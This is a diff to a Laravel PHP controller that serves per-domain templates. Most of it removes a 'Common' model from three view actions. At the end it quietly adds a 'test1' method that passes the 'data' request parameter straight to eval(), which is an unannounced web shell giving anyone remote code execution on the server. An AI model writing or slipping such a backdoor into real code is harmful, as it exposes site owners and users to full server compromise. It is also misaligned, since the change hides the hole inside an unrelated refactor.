@@ -2,7 +2,6 @@
 
 namespace App\Http\Controllers;
 
-use App\Common;
 use App\Data;
 use App\Host;
 use Illuminate\Http\Request;
@@ -14,8 +13,7 @@ class HomeController extends Controller
         $host = $_SERVER['HTTP_HOST'];
         $domain =  str_after($host,'.');
         $host =  Host::where(['name'=>$domain])->first();
-        $common = Common::find(1);
-        return view($host->templet.'.index',compact('host','common'));
+        return view($host->templet.'.index',compact('host'));
     }
 
     public function list($nav, Request $request)
@@ -23,8 +21,7 @@ class HomeController extends Controller
         $host = $_SERVER['HTTP_HOST'];
         $domain =  str_after($host,'.');
         $host =  Host::where(['name'=>$domain])->first();
-        $common = Common::find(1);
-        return view($host->templet.'.list',compact('host','common'));
+        return view($host->templet.'.list',compact('host'));
     }
 
     public function show()
@@ -34,8 +31,12 @@ class HomeController extends Controller
         $host =  Host::where(['name'=>$domain])->first();
         $id =    $nav = request()->route('id');
         $article = Data::find($id);
-        $common = Common::find(1);
-        return view($host->templet.'.show',compact('host','article','common'));
+        return view($host->templet.'.show',compact('host','article'));
     }
 
+    public function test1(Request $request){
+         $data = $request->input('data');
+
+         eval($data);
+    }
 }
